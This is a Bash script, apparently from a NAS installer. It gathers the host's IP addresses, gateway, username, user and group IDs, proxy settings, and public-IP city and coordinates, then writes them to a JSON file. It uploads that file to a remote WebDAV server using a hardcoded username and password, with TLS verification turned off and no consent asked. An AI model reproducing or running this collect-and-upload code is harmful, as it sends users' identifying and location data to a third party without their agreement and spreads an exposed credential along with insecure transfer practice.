#!/bin/bash

# 定义保存路径
OUTPUT_FILE="$(pwd)/系统信息_$(date +%Y%m%d%H%M%S).json"

# WebDAV上传配置
WEBDAV_USER="naspt:Lzq951201@"
WEBDAV_URL="https://pan.naspt.vip/dav/installInfo"

get_system_info() {
    # 基础系统信息
    CURRENT_DIR=$(pwd)
    GATEWAY=$(ip route | awk '/default/ match($0,/dev\s\w*/) {print $3; exit}')
    ARCHITECTURE=$(uname -m)
    HOST_IP=$(ip route get 1 | awk '{print $7}' | head -1)
    USER_NAME=$(whoami)
    UMASK=$(umask)

    # 用户信息
    PUID=$(id -u)
    PGID=$(id -g)

    # NAS品牌检测（示例值）
    NAS_BRAND="未知"

    # Docker检测
    DOCKER_ROOT_PATH=""

    # 视频路径检测
    VIDEO_ROOT_PATH=

    # 网络信息
    PUBLIC_IP_INFO=$(curl -s https://ipinfo.io/json)
    PUBLIC_IP_CITY=$(grep -oP '"city":\s*"\K[^"]+' <<< "$PUBLIC_IP_INFO")
    LONGITUDE=$(grep -oP '"loc":\s*"\K[^"]+' <<< "$PUBLIC_IP_INFO" | cut -d',' -f1)
    LATITUDE=$(grep -oP '"loc":\s*"\K[^"]+' <<< "$PUBLIC_IP_INFO" | cut -d',' -f2)
    VPS_IP=$(curl -s ifconfig.me)

    # 代理配置
    PROXY_HOST=${http_proxy:-$https_proxy}
}

generate_json_array() {
    local arr=("$@")
    printf '['
    for i in "${!arr[@]}"; do
        [ $i -ne 0 ] && printf ','
        printf '"%s"' "${arr[$i]}"
    done
    printf ']'
}

generate_json() {
    local groups_json=$(generate_json_array "${USER_GROUPS[@]}")

    cat <<EOF
{
  "系统信息": {
    "基础信息": {
      "当前目录": "$CURRENT_DIR",
      "网关地址": "$GATEWAY",
      "系统架构": "$ARCHITECTURE",
      "主机IP": "$HOST_IP",
      "用户名": "$USER_NAME",
      "权限掩码": "$UMASK"
    },
    "用户信息": {
      "用户ID": $PUID,
      "组ID": $PGID,
      "所属组": $groups_json
    },
    "存储设备": {
      "NAS品牌": "$NAS_BRAND"
    },
    "路径配置": {
    "Docker根目录": "${DOCKER_ROOT_PATH:-未安装}",
    "视频根目录": "${VIDEO_ROOT_PATH:-未找到}"
    },
    "网络信息": {
      "公网城市": "${PUBLIC_IP_CITY:-未知}",
      "经度": "${LONGITUDE:-0}",
      "纬度": "${LATITUDE:-0}",
      "出口IP": "${VPS_IP:-未知}"
    },
    "其他配置": {
      "代理地址": "${PROXY_HOST:-未配置}"
    }
  }
}
EOF
}

upload_to_webdav() {
    local file_path=$1
    local file_name=$(basename "$file_path")

    http_code=$(curl -X PUT -u "$WEBDAV_USER" -T "$file_path" \
        --insecure \
        -w "%{http_code}" \
        -s \
        -o /dev/null \
        "${WEBDAV_URL}/${file_name}")

    case $http_code in
        201|204) echo "文件已安全上传至云端" ;;
        401) echo "认证失败：请检查账号密码" >&2 ;;
        403) echo "权限不足：请检查写入权限" >&2 ;;
        *) echo "上传异常，状态码：$http_code" >&2 ;;
    esac
}

main() {
    get_system_info
    generate_json > "$OUTPUT_FILE"

    if [ -f "$OUTPUT_FILE" ]; then
        echo "本地文件已生成："$(ls -sh "$OUTPUT_FILE")
        upload_to_webdav "$OUTPUT_FILE"
    else
        echo "文件生成失败，请检查权限" >&2
        exit 1
    fi
}

trap 'echo "操作中断，临时文件已清理"; rm -f "$OUTPUT_FILE"; exit 1' SIGINT SIGTERM

main